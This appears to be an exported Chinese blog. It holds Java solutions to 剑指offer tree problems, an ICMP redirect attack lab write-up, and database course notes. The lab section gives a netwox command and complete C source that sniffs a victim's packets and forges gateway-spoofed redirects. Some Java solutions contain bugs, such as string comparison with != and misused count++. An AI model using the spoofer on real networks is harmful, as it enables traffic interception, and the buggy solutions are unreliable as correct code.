null; public TreeNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; boolean isSymmetrical(TreeNode pRoot) &#123; TreeNode copy = copyTree(pRoot); mirrorTree(pRoot); return compare(pRoot, copy); &#125; //二叉树的深拷贝 private TreeNode copyTree(TreeNode pRoot) &#123; if (pRoot == null) &#123; return null; &#125; TreeNode root = new TreeNode(pRoot.val); root.left = copyTree(pRoot.left); root.right = copyTree(pRoot.right); return root; &#125; //二叉树的镜像化 private void mirrorTree(TreeNode pRoot) &#123; if (pRoot == null) &#123; return; &#125; mirrorTree(pRoot.left); mirrorTree(pRoot.right); TreeNode temp; temp = pRoot.left; pRoot.left = pRoot.right; pRoot.right = temp; &#125; //比较原二叉树与镜像二叉树是否一致 private boolean compare(TreeNode one, TreeNode two) &#123; if (one == null &amp;&amp; two == null) &#123; return true; &#125; if (one != null &amp;&amp; two != null &amp;&amp; one.val == two.val) &#123; return compare(one.left, two.left) &amp;&amp; compare(one.right, two.right); &#125; else &#123; return false; &#125; &#125;&#125; 59.按之字形顺序打印二叉树标签：【栈】【树】题目描述 请实现一个函数按照之字形打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右至左的顺序打印，第三行按照从左到右的顺序打印，其他行以此类推。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import java.util.ArrayList;import java.util.Stack;/*public class TreeNode &#123; int val = 0; TreeNode left = null; TreeNode right = null; public TreeNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; public ArrayList&lt;ArrayList&lt;Integer&gt;&gt; Print(TreeNode pRoot) &#123; ArrayList&lt;ArrayList&lt;Integer&gt;&gt; res = new ArrayList&lt;ArrayList&lt;Integer&gt;&gt;(); int count = 1; //奇数层栈 Stack&lt;TreeNode&gt; stackodd = new Stack&lt;TreeNode&gt;(); //偶数层栈 Stack&lt;TreeNode&gt; stackeven = new Stack&lt;TreeNode&gt;(); if (pRoot != null) &#123; stackodd.add(pRoot); &#125; else &#123; return res; &#125; while (!stackodd.isEmpty() || !stackeven.isEmpty()) &#123; //奇数层处理 if (count % 2 != 0) &#123; ArrayList&lt;Integer&gt; temp = new ArrayList(); //奇数层出栈 while (!stackodd.isEmpty()) &#123; TreeNode root = stackodd.pop(); temp.add(root.val); //左孩子入偶数层栈 if (root.left != null) &#123; stackeven.push(root.left); &#125; //右孩子入偶数层栈 if (root.right != null) &#123; stackeven.push(root.right); &#125; &#125; if (!temp.isEmpty()) &#123; res.add(temp); count++; &#125; &#125; //偶数层处理 else &#123; ArrayList&lt;Integer&gt; temp = new ArrayList(); //偶数层出栈 while (!stackeven.isEmpty()) &#123; TreeNode root = stackeven.pop(); temp.add(root.val); //右孩子入奇数层栈 if (root.right != null) &#123; stackodd.push(root.right); &#125; //左孩子入奇数层栈 if (root.left != null) &#123; stackodd.push(root.left); &#125; &#125; if (!temp.isEmpty()) &#123; res.add(temp); count++; &#125; &#125; &#125; return res; &#125;&#125; 60.把二叉树打印成多行标签：【树】【bfs】题目描述 从上到下按层打印二叉树，同一层结点从左至右输出。每一层输出一行。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import java.util.ArrayList;import java.util.LinkedList;/*public class TreeNode &#123; int val = 0; TreeNode left = null; TreeNode right = null; public TreeNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; ArrayList&lt;ArrayList&lt;Integer&gt;&gt; Print(TreeNode pRoot) &#123; ArrayList&lt;ArrayList&lt;Integer&gt;&gt; res = new ArrayList&lt;ArrayList&lt;Integer&gt;&gt;(); ArrayList&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); LinkedList&lt;TreeNode&gt; queue = new LinkedList&lt;TreeNode&gt;(); if (pRoot != null) &#123; queue.offer(pRoot); int deep = deepth(pRoot); int count = 0; while (!queue.isEmpty() &amp;&amp; count &lt;= (Math.pow(2, deep) - 1)) &#123; count++; TreeNode temp = queue.poll(); list.add(temp.val); if (temp.left != null) &#123; queue.offer(temp.left); &#125; else &#123; temp.left = new TreeNode('#'); queue.offer(temp.left); &#125; if (temp.right != null) &#123; queue.offer(temp.right); &#125; else &#123; temp.right = new TreeNode('#'); queue.offer(temp.right); &#125; &#125; int sum = 0; for (int i = 0; i &lt; deep; i++) &#123; int persum = (int) Math.pow(2, i); ArrayList&lt;Integer&gt; temp = new ArrayList&lt;Integer&gt;(); for (int j = 0; j &lt; persum; j++) &#123; if (list.get(sum) != '#') &#123; temp.add(list.get(sum)); &#125; sum++; &#125; res.add(temp); &#125; &#125; return res; &#125; //树的深度 private int deepth(TreeNode root) &#123; if (root == null) &#123; return 0; &#125; int left = deepth(root.left); int right = deepth(root.right); return 1 + (left &gt;= right ? left : right); &#125;&#125; 61.序列化二叉树标签：【树】【序列化】题目描述 请实现两个函数，分别用来序列化和反序列化二叉树 二叉树的序列化是指：把一棵二叉树按照某种遍历方式的结果以某种格式保存为字符串，从而使得内存中建立起来的二叉树可以持久保存。序列化可以基于先序、中序、后序、层序的二叉树遍历方式来进行修改，序列化的结果是一个字符串，序列化时通过 某种符号表示空节点（#），以 ！ 表示一个结点值的结束（value!）。 二叉树的反序列化是指：根据某种遍历顺序得到的序列化字符串结果str，重构二叉树。 例如，我们可以把一个只有根节点为1的二叉树序列化为”1,”，然后通过自己的函数来解析回这个二叉树 12345678910111213141516171819202122232425262728293031323334353637/*public class TreeNode &#123; int val = 0; TreeNode left = null; TreeNode right = null; public TreeNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; int count = -1; //序列化 String Serialize(TreeNode root) &#123; if (root == null) &#123; return "#"; &#125; //类似前序遍历的方式序列化 return "" + root.val + "," + Serialize(root.left) + Serialize(root.right); &#125; TreeNode Deserialize(String str) &#123; String[] input = str.split(","); //前序方式遍历的位置 count++; TreeNode node = null; if (input[count] != "#") &#123; node = new TreeNode(Integer.parseInt(input[count])); node.left = Deserialize(str); node.right = Deserialize(str); &#125; return node; &#125;&#125; 62.二叉搜索树的第K个结点标签：【树】题目描述 给定一棵二叉搜索树，请找出其中的第k小的结点。例如， （5，3，7，2，4，6，8） 中，按结点数值大小顺序第三小结点的值为4。 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.util.PriorityQueue;import java.util.HashMap;/*public class TreeNode &#123; int val = 0; TreeNode left = null; TreeNode right = null; public TreeNode(int val) &#123; this.val = val; &#125;&#125;*/public class Solution &#123; //优先级队列保存结点值，堆顶是最小值 PriorityQueue&lt;Integer&gt; queue = new PriorityQueue&lt;Integer&gt;(); //保存值与结点之间的关联关系 HashMap&lt;Integer, TreeNode&gt; map = new HashMap&lt;Integer, TreeNode&gt;(); //二叉搜索树的第K个结点 TreeNode KthNode(TreeNode pRoot, int k) &#123; search(pRoot); if (k &lt;= 0 || k &gt; queue.size()) &#123; return null; &#125; for (int i = 1; i &lt; k; i++) &#123; queue.poll(); &#125; return map.get(queue.peek()); &#125; //中序遍历二叉搜索树得到一个排序的序列 private void search(TreeNode pRoot) &#123; if (pRoot == null) &#123; return; &#125; search(pRoot.left); queue.offer(pRoot.val); map.put(pRoot.val, pRoot); search(pRoot.right); &#125;&#125; 63.数据流中的中位数标签：【进制转化】【排序】【堆】题目描述 如何得到一个数据流中的中位数？如果从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值。如果从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值。我们使用Insert()方法读取数据流，使用GetMedian()方法获取当前读取数据的中位数。 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.util.*;public class Solution &#123; int count = 0; PriorityQueue&lt;Integer&gt; minHeap = new PriorityQueue&lt;&gt;(); PriorityQueue&lt;Integer&gt; maxHeap = new PriorityQueue&lt;Integer&gt;(15, new Comparator&lt;Integer&gt;() &#123; @Override //降序，实现大顶堆 public int compare(Integer o1, Integer o2) &#123; return o2 - o1; &#125; &#125;); public void Insert(Integer num) &#123; if (count % 2 == 0) &#123;//当数据总数为偶数时，新加入的元素，应当进入小根堆 //（注意不是直接进入小根堆，而是经大根堆筛选后取大根堆中最大元素进入小根堆） //1.新加入的元素先入到大根堆，由大根堆筛选出堆中最大的元素 maxHeap.offer(num); int filteredMaxNum = maxHeap.poll(); //2.筛选后的【大根堆中的最大元素】进入小根堆 minHeap.offer(filteredMaxNum); &#125; else &#123;//当数据总数为奇数时，新加入的元素，应当进入大根堆 //（注意不是直接进入大根堆，而是经小根堆筛选后取小根堆中最大元素进入大根堆） //1.新加入的元素先入到小根堆，由小根堆筛选出堆中最小的元素 minHeap.offer(num); int filteredMinNum = minHeap.poll(); //2.筛选后的【小根堆中的最小元素】进入大根堆 maxHeap.offer(filteredMinNum); &#125; count++; &#125; public Double GetMedian() &#123; //从数据流中读出偶数个数值，那么中位数就是所有数值排序之后中间两个数的平均值 if (count % 2 == 0) &#123; return new Double((minHeap.peek() + maxHeap.peek())) / 2; &#125; //从数据流中读出奇数个数值，那么中位数就是所有数值排序之后位于中间的数值 else &#123; return new Double(minHeap.peek()); &#125; &#125;&#125; 64.滑动窗口的最大值标签：【堆】【双指针】题目描述 给定一个数组和滑动窗口的大小，找出所有滑动窗口里数值的最大值。例如，如果输入数组{2,3,4,2,6,2,5,1}及滑动窗口的大小3，那么一共存在6个滑动窗口，他们的最大值分别为{4,4,6,6,6,5}； 针对数组{2,3,4,2,6,2,5,1}的滑动窗口有以下6个： {[2,3,4],2,6,2,5,1}， {2,[3,4,2],6,2,5,1}， {2,3,[4,2,6],2,5,1}， {2,3,4,[2,6,2],5,1}， {2,3,4,2,[6,2,5],1}， {2,3,4,2,6,[2,5,1]}。 窗口大于数组长度的时候，返回空 12345678910111213141516171819202122232425262728293031323334import java.util.ArrayList;import java.util.PriorityQueue;import java.util.Collections;public class Solution &#123; public ArrayList&lt;Integer&gt; maxInWindows(int[] num, int size) &#123; ArrayList&lt;Integer&gt; res = new ArrayList&lt;Integer&gt;(); if (size &gt; num.length || size &lt;= 0) &#123; return res; &#125; //窗口下标 int low = 0; //窗口上标 int high = size - 1; //大顶堆 PriorityQueue&lt;Integer&gt; heap = new PriorityQueue&lt;Integer&gt;(Collections.reverseOrder()); //初始化窗口，入堆 for (int i = low; i &lt;= high; i++) &#123; heap.offer(num[i]); &#125; //滑动窗口，获取每次窗口的最大值 while (high &lt; num.length - 1) &#123; res.add(heap.peek()); heap.remove(num[low]); low++; high++; heap.offer(num[high]); &#125; //获取最后一个窗口的最大值 res.add(heap.peek()); return res; &#125;&#125; 65.矩阵中的路径标签：【dfs】【回溯】题目描述 请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向左，向右，向上，向下移动一个格子。如果一条路径经过了矩阵中的某一个格子，则该路径不能再进入该格子。 例如: a b c e s f c s a d e e 矩阵中包含一条字符串”bcced”的路径，但是矩阵中不包含”abcb”路径，因为字符串的第一个字符b占据了矩阵中的第一行第二个格子之后，路径不能再次进入该格子。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class Solution &#123; public boolean hasPath(char[] matrix, int rows, int cols, char[] str) &#123; if (matrix == null || matrix.length == 0 || rows &lt;= 0 || cols &lt;= 0 || str == null || str.length == 0) &#123; return false; &#125; //矩阵 char[][] m = new char[rows][cols]; //访问标记 int[][] visit = new int[rows][cols]; //矩阵初始化 for (int i = 0; i &lt; rows; i++) &#123; for (int j = 0; j &lt; cols; j++) &#123; m[i][j] = matrix[i * cols + j]; &#125; &#125; //从m[i][j]出发搜索 for (int i = 0; i &lt; rows; i++) &#123; for (int j = 0; j &lt; cols; j++) &#123; int count = 0; if (find(m, rows, cols, str, i, j, count, visit)) &#123; return true; &#125; &#125; &#125; return false; &#125; private boolean find(char[][] matrix, int rows, int cols, char[] str, int srow, int scol, int count, int[][] visit) &#123; //已达到目标字符串的长度 if (count &gt;= str.length) &#123; return true; &#125; if (srow &gt;= rows || scol &gt;= cols || srow &lt; 0 || scol &lt; 0 || visit[srow][scol] == 1) &#123; return false; &#125; //置位访问标记 visit[srow][scol] = 1; boolean flag = false; //当前位置的字符与目标字符一致，接着向上下左右四个方向继续搜索 if (matrix[srow][scol] == str[count]) &#123; flag = find(matrix, rows, cols, str, srow + 1, scol, count++, visit) || find(matrix, rows, cols, str, srow - 1, scol, count++, visit) || find(matrix, rows, cols, str, srow, scol + 1, count++, visit) || find(matrix, rows, cols, str, srow, scol - 1, count++, visit); &#125; //取消访问标记 visit[srow][scol] = 0; return flag; &#125;&#125; 66.机器人的运动范围标签：【数组】题目描述 地上有一个m行和n列的方格。一个机器人从坐标0,0的格子开始移动，每一次只能向左，右，上，下四个方向移动一格，但是不能进入行坐标和列坐标的数位之和大于k的格子。 例如，当k为18时，机器人能够进入方格（35,37），因为3+5+3+7 = 18。但是，它不能进入方格（35,38），因为3+5+3+8 = 19。请问该机器人能够达到多少个格子？ 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class Solution &#123; //格子数统计 int count = 0; public int movingCount(int threshold, int rows, int cols) &#123; if (threshold &lt; 0) &#123; return 0; &#125; //访问标记 int[][] visit = new int[rows][cols]; find(threshold, rows, cols, 0, 0, visit); return count; &#125; //开始统计 private void find(int threshold, int rows, int cols, int sr, int sc, int[][] visit) &#123; if (sr &gt;= rows || sr &lt; 0 || sc &gt;= cols || sc &lt; 0 || visit[sr][sc] == 1) &#123; return; &#125; if (sum(sr, sc) &gt; threshold) &#123; return; &#125; //访问标记置位 visit[sr][sc] = 1; //格子数加一 count++; find(threshold, rows, cols, sr + 1, sc, visit); find(threshold, rows, cols, sr - 1, sc, visit); find(threshold, rows, cols, sr, sc + 1, visit); find(threshold, rows, cols, sr, sc - 1, visit); &#125; //计算数位之和 private int sum(int row, int col) &#123; int sumR = 0; int sumC = 0; while (row != 0) &#123; sumR += row % 10; row /= 10; &#125; while (col != 0) &#123; sumC += col % 10; col /= 10; &#125; return sumR + sumC; &#125;&#125; 67.剪绳子标签：【贪心】【数组】【数量关系】【高级算法】【组合数学】题目描述 给你一根长度为n的绳子，请把绳子剪成整数长的m段（m、n都是整数，n&gt;1并且m&gt;1，m&lt;=n），每段绳子的长度记为k[1],…,k[m]。请问k[1]x…xk[m]可能的最大乘积是多少？例如，当绳子的长度是8时，我们把它剪成长度分别为2、3、3的三段，此时得到的最大乘积是18。 输入描述： 12&gt; 输入一个数n，意义见题面。（2 &lt;= n &lt;= 60）&gt; 输出描述： 12&gt; 输出答案。&gt; 示例1 输入 12&gt; 8&gt; 输出 12&gt; 18&gt; 123456789101112131415161718192021222324252627282930313233343536public class Solution &#123; public int cutRope(int target) &#123; if (target == 2) &#123; return 1; &#125; if (target == 3) &#123; return 2; &#125; //记录表 int[] record = new int[target + 1]; //记录表初始化 for (int i = 0; i &lt; target + 1; i++) &#123; record[i] = -1; &#125; return solve(target, record); &#125; private int solve(int target, int[] record) &#123; //剩余的长度在4及以下直接返回，最佳解是不再分割 if (target &lt;= 4) &#123; return target; &#125; //记录表中有纪录，直接返回，避免重复计算 if (record[target] != -1) &#123; return record[target]; &#125; int max = 0; //自下而上，由子问题最优解得到问题的最优解 for (int i = 1; i &lt; target; i++) &#123; max = Math.max(max, i * solve((target - i), record)); &#125; //子问题的最优解纪录到记录表中 record[target] = max; return max; &#125;&#125;]]></content>
      <categories>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>剑指offer</tag>
        <tag>算法</tag>
        <tag>刷题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息安全实战——重定向攻击]]></title>
    <url>%2F2019%2F04%2F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E2%80%94ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[说明： 攻击者主机 192.168.18.43 受害者主机 192.168.18.44 网关 192.168.18.254 一、Netwox命令实现重定向 1、查看主机ICMP重定向是否开启 2、开启ICMP重定向 3、目前在受害者主机上ping网址正常 4、netwox 86 -f “host 192.168.18.44” -g 192.168.18.43 -i 192.168.18.254 命令执行后 ping包重定向 5、抓包 二、安装pcap 1、安装系统依赖包 apt-get install gcc libc6-dev apt-get install m4 apt-get install flex bison 2、下载libpcap源码包 http://www.tcpdump.org/ 3、将libpcap源码包存放并解压到指定位置 tar -xf libpcap-1.9.0.tar.gz -C /usr/local/lib/libpcap/ 4、编译安装 ./configure make &amp;&amp; make install 5、可能需要在/etc/ld.so.conf 添加两行配置 改成如下 include /etc/ld.so.conf.d/*.conf include /usr/local/lib include /usr/lib 三、ICMP重定向攻击源代码及分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370#include &lt;pcap.h&gt;#include &lt;time.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#include &lt;stdio.h&gt;#include &lt;netinet/in.h&gt;#include &lt;netinet/ip.h&gt;#include &lt;netinet/ip_icmp.h&gt;#include&lt;sys/socket.h&gt;#include&lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;assert.h&gt; #define DATA_LEN 8 #define SIZE_ETHERNET 14#define HEAD_MAX 64 uint32_t Vic_IP; //被攻击者IPuint32_t Ori_Gw_IP; //网关IPuint32_t Redic_IP; //攻击者IPuint16_t ip_id=0; //参考 https://blog.csdn.net/wangzhen_csdn/article/details/80461269//计算校验和static uint16_t checksum(void *buf,int len)&#123; uint32_t sum=0; uint16_t *cbuf=buf; while(len&gt;1) &#123; sum+=*cbuf++; len-=2; &#125; if(len) sum+=*(u_int8_t *)cbuf; sum=(sum&gt;&gt;16)+(sum &amp; 0xffff); sum+=(sum&gt;&gt;16); return ~sum;&#125; void getPacket(u_char * arg, const struct pcap_pkthdr * pkthdr, const u_char * packet)&#123; int sockfd,res; int one = 1; int *ptr_one = &amp;one; //1:AF_INET参数 表示用于处理ip层的数据 2:SOCK_RAW 指定用原始套接字编程 3:指定icmp报文 //如果 socket没有创建成功 会返回负值 if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))&lt;0) &#123; printf("create sockfd error\n"); exit(-1); &#125; //参数1：sockfd 要被设置或者获取选项的套接字 2:IP选项 //3：IP_HDRINCL 如果没有开启IP_HDRINCL选项，那么内核会帮忙处理IP头部。如果设置了IP_HDRINCL选项，那么用户需要自己生成IP头部的数据 //4:ptr_one 作为选项值的缓冲 //5: 选项值的长度 res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, sizeof(one)); if(res &lt; 0) &#123; printf("error--\n"); exit(-3); &#125; struct iphdr*ipd=(struct iphdr*)(packet+SIZE_ETHERNET); uint8_t re_size=(ipd-&gt;ihl&lt;&lt;2)+DATA_LEN; //获取首部长度5 左移两位 re_size 28 bytes uint8_t all_size=sizeof(struct iphdr)+sizeof(struct icmphdr)+re_size; &#123; struct&#123; struct iphdr ip; struct icmphdr icmp; uint8_t data[HEAD_MAX+DATA_LEN]; &#125;packet=&#123; .ip=&#123; .version = 4, .ihl = 5, //首部长度 .id=ip_id++, .tos = 0, .tot_len = htons(all_size), //host to network long 网络字节序 .frag_off = 0, .ttl = 255, .check = 0, .protocol = IPPROTO_ICMP, .saddr = Ori_Gw_IP, .daddr = Vic_IP &#125;, .icmp=&#123; .type = ICMP_REDIRECT, .code = ICMP_REDIR_HOST, .checksum = 0, .un=&#123; .gateway=Redic_IP &#125; &#125; &#125;; memcpy(packet.data,ipd,re_size); //memcpy 把构造的ip数据报放到packet.data中 packet.ip.check = checksum(&amp;packet.ip, sizeof(packet.ip)); packet.icmp.checksum = checksum(&amp;packet.icmp, sizeof(packet.icmp)+re_size); struct sockaddr_in dest=&#123; .sin_family=AF_INET, .sin_addr=&#123; .s_addr=(Vic_IP) &#125; &#125;; sendto(sockfd,&amp;packet,all_size,0,(struct sockaddr *)&amp;dest,sizeof(dest)); &#125;&#125; void run(char *cmd,char *out)&#123; //popen 创建出一个管道，然后执行CMD命令，返回值为FILE* 指针类型，由于管道数据流是单向的，command只能产生stdout或者读取stdin // 参数'r' 表示CMD从管道中读取数据流，而w表示command的stdout输出到管道中 FILE *fp=popen(cmd,"r"); //fscanf 是用于格式化输入到out中 fscanf(fp,"%s",out); pclose(fp);&#125; int main(int argv,char *args[])&#123; assert(argv==2); //asert 作用是判断条件argv==2 是否为真，如果为假 打印出错信息 因为在linux上运行shi ./filename ip_addr 判断 argv==2 Vic_IP=inet_addr(args[1]); // 执行文件的时候传入 受害者IP地址 char errBuf[PCAP_ERRBUF_SIZE], * devStr; char ip[16]; char buf[1024]; /* get a device */ //获取网络接口设备名,成功就返回设备名指针，失败的话返回NULL，同时,errbuf存放出错误信息字符串 devStr = pcap_lookupdev(errBuf); if(devStr) &#123; printf("success: device: %s\n", devStr); &#125; else &#123; printf("error: %s\n", errBuf); exit(1); &#125; //ifconfig eth0 | awk '$1 ~/inet$/ &#123;print $2&#125;' | awk -F: '&#123;print $2&#125;' //上面是一条Linux命令，用于截取ifconfig eth0 的IP地址 格式化输出到buf中 sprintf(buf,"ifconfig %s|awk '$1 ~ /inet$/ &#123;print $2&#125;'|awk -F: '&#123;print $2&#125;'",devStr); //run函数用于解析出 攻击者的IP 保存到char ip[16]; run(buf,ip); Redic_IP=inet_addr(ip); //打印攻击者的IP printf("get ip %s\n",ip); //route|awk '$1 ~ /default/ &#123;print $2&#125;' //上面是一条Linux命令，用于截取eth0的网关地址 格式化输出到buf中 sprintf(buf,"route|awk '$1 ~ /default/ &#123;print $2&#125;'"); //同理 run函数用于解析出攻击者的网关 保存到char ip[16]中 run(buf,ip); Ori_Gw_IP=inet_addr(ip); printf("get gateway %s\n",ip); /* open a device, wait until a packet arrives */ //根据上一步获得的网络接口设备名 打开网络接口 参数1:网络接口的名字 2：捕获数据包的长度 3:开启混杂模式 4:指定等待毫秒数 0表示一直等待 直到有数据报 5:存储错误信息 pcap_t * device = pcap_open_live(devStr, 65535, 1, 0, errBuf); //设置过滤条件 struct bpf_program filter; char filterstr[50]=&#123;0&#125;; //src host 指定只接受源IP是 被攻击者IP的地址 sprintf(filterstr,"src host %s",args[1]); //参数1： 上一步获得的设备接口指针 2、应用过滤条件 3、之前设置的过滤条件：即只接受源IP是被攻击者的IP地址 //4: 表示是否需要优化过滤表达式 1表示优化 5：mask 指定本地网络的网络掩码，不需要时写0 pcap_compile(device,&amp;filter,filterstr,1,0); //应用过滤规则 pcap_setfilter(device,&amp;filter); //参数：1：上一步获得的设备接口指针 2:指定捕获数据包的个数，一旦抓到了 cnt 个数据包，pcap_loop 立即返回。如果是 -1，就会永无休止的捕获，直到出现错误。 //3:getPacket 回调函数，名字任意，根据需要自行起名。 4: 向回调函数中传递的参数 一般设置为NULL pcap_loop(device, -1, getPacket, NULL); return 0;&#125;]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>ICMP</tag>
        <tag>信息安全</tag>
        <tag>网络安全</tag>
        <tag>ip</tag>
        <tag>重定向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式数据库——第二章 数据与数据模型]]></title>
    <url>%2F2019%2F03%2F%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[1.数据与数据模型 •数据 – 给定事实 •数据模型 – 抽象的, 自含的, 对象和操作符等的逻辑定义, 所有这些一起组成了抽象机 •实现 – 真实机器上的物理实现 •数据抽象 –实体与联系 实体（Entities） supplier, part, project, warehouse, employee …. 联系（Relationships） sp, sj, spj……. –特征 (Properties) 供应商 : location…. 零件 : weight ….. 2.数据独立 •数据库技术的主要目标 •适应应用需求，数据物理表示和访问技术的改变是必要的 •两类独立性 物理数据独立 当数据库的内部存储结构发生改变时，只要修改模式/内模式映象，可保持概念模式不变，从而保持外模式以及用户程序的不变，保证了数据与程序的物理独立性——数据的物理独立性 逻辑数据独立 当概念模式发生改变时，只要修改外模式/模式映象，可保持外模式不变，从而保持用户应用程序不变，保证了数据与用户程序的逻辑独立性——数据的逻辑独立性 3.体系结构 •三层体系结构 •外模式 单个用户所看到的局部数据的逻辑结构和特征的描述 建立在概念模式之上，同一概念模式上可有多个不同的外模式 通过外模式DDL进行定义 •概念模式 数据库中全体数据的逻辑结构和特征的描述 一个数据库只有一个概念模式 通过模式DDL进行定义 •内模式 数据物理结构和存储方式的描述 一个数据库只有一个内模式 通过内模式DDL定义 4.关系模型 •术语 域 （Domain） 一组具有相同数据类型的值的集合。每个属性有一个域 属性 （Attribute） 二维表格的每一列 元组 （Tuple） 每一行称为关系的一个元组 基数 （Cardinality） 元组的数目 度 （Degree） 列的数目 •性质 一个关系是一个规范化的二维表格 属性值不可分解 不允许表中有表 元组不可重复 因此一个关系模式至少存在一个候选码 没有行序，即元组之间无序 关系是元组的集合，集合的元素是无序的 没有列序，即属性之间无序 关系模式是属性的集合 •操作 选择 （select） 从表中抽取指定的行 投影 （ Project） 从表中抽取指定的列 连接 （Join） 在公共列的基础上连接两个表 以集合为单元操作 算子和结果都是表 闭包性质 一个操作的的输出结果可以是另一个操作的输入 •Key 候选键（Candidate Keys） 当且仅当如下条件成立K 是关系R候选键 唯一性（Uniqueness） 最小性（Irreducibility） e.g. S(s#) 是键, S(s#, age) 是超键（ super key ） 主关键字(Primary Keys)与候选键 Primary key 是被关系选中的候选键 主关键字不能取空值（not null） 外关键字（Foreign Key） – R2 是一关系, R2 中的外关键字是R2的一组属性, FK, 满足: 存在关系R1 有候选键 CK R2 中的每个FK 值一定与 R1中某个元组的CK值相等. 引用完整性 数据库不能含有任何不匹配的外关键字 ON DELETE CASCADE/RESTRICT/NO ACTION ON UPDATE CASCADE/RESTRICT/NO ACTION 解释：引用关系做删除和更新操作的影响：CASCADE跟随一起变化，RESTRICT受限，不允许删除和更新，NO ACTION 不变化——引用完整性受到影响。 •语言 （SQL，代数） DDL 数据库定义语言 创建create – Table – View – Index 例： 创建表： Create Table DEPT ( DEPT# Number, DNAME Char(5), Budget Number( 7,2)); 创建索引： Create index I1 on EMP (E#); Create index I2 on EMP (Ename); 创建唯一性索引： Create unique index I1 on EMP (E#); 创建聚集索引（ 元组按照索引值顺序，物理上尽可能的存储在一起 ,在索引值上执行扫描（scan）操作时可以减少 I/O.）： Create cluster index CI1 on EMP (E#); 含有完整性定义得关系定义例子： Create Table SP ( s# s# not null, p# p# not null, qty qty not null, primary key (s#, p#), foreign key (s#) references S on delete cascade on update cascade, foreign key (p#) references P on delete cascade on update cascade, check (qty &gt;0 and qty &lt;5001) ); DML数据库操纵语言 查询select 例： 查询年龄40岁以下不同部门平均工资大于6000的部门，并按部门降序列表。 select d#, avg (SAL) from EMP where age &lt; 40 group by d# having avg (SAL) &gt; 6000 order by d# desc； 查询在sale部门工作的职工名。 select distinct Ename from EMP where d# in (select d# from DEPT where Dname=‘sale’) 查询缺少某门课成绩的学生学号。 Select s# From SC Where score IS NULL 查询只选修了1门或2门课程的学生学号、姓名和课程数。 Select student.s#, sname, count_c# From (Select s# as s#, count(s#) as count_c# From sc Group by s#) SC2, student Where sc2.s# = student.s# and (count_c#=1 OR count_c#=2) 删除delete 例： 删除所有低于平均工资的职工 。 delete from EMP where SAL &lt; (select avg (SAL) from EMP) 插入insert 例： insert into S (status, city, s#, sname) values (20, ‘shanghai’, ‘s6’, ‘wang ping’ )； 对所有在黄山路 支行的贷款者$200 存款的礼物。 insert into account select loan-number, branch-name, 200 from loan where branch-name = ‘huangshanlu’ 更新update 例： 工资大于 $4,000 的增加 6%, 其他职工工资增加 5%. 嵌入SQL 单元组查询 EXEC SQL Select Ename INTO :ename From EMP Where e# = ‘e1’ 查询供应了amount 数量零件的供应商名字和其所在的城市，先定义游标（ cursor） EXEC SQL declare c cursor for select sname, city from S, SP where S.s# = SP.s# and SP.QTY &gt; :amount 游标打开语句（ open ），执行游标查询 EXEC SQL open c 游标取语句（fetch ）获取一个元组送入主变量 EXEC SQL fetch c into :cn, :cc 通过循环调用fetch语句，获取所有元组 游标关闭语句（ close ） EXEC SQL close c 游标更新定义 declare c cursor for select * from EMP where city = ‘Parise’ for update 修改当前游标元组 update EMP set SAL = SAL + 100 where current of c 关系代数 关系代数的符号 关系代数表达式 并 R∪S＝｛t∣t∈R∨t∈S｝ –t是元组变量 –R和S是关系代数表达式 –R与S的degree必须相同 –R与S的属性类型必须相同 交 R∩S＝｛t∣t∈R∧t∈S｝ 差 积 选择 –水平划分关系 –F是一个逻辑表达式，表示所选的元组应满足的条件 –F由逻辑运算符┐(NOT)、∧(AND)、∨(OR)连接算术表达式构成 •算术表达式形为XθY，θ可以是&gt;,&lt;,=, ≤,≥或≠，X和Y可以是属性名、常量或简单函数 投影 自然联接 设R的属性集为{X,Y}，S的属性集为{Y,Z} R∞S=t|t=&lt;X,Y,Z&gt;∧t[X,Y]∈R∧t[Y,Z]∈S} 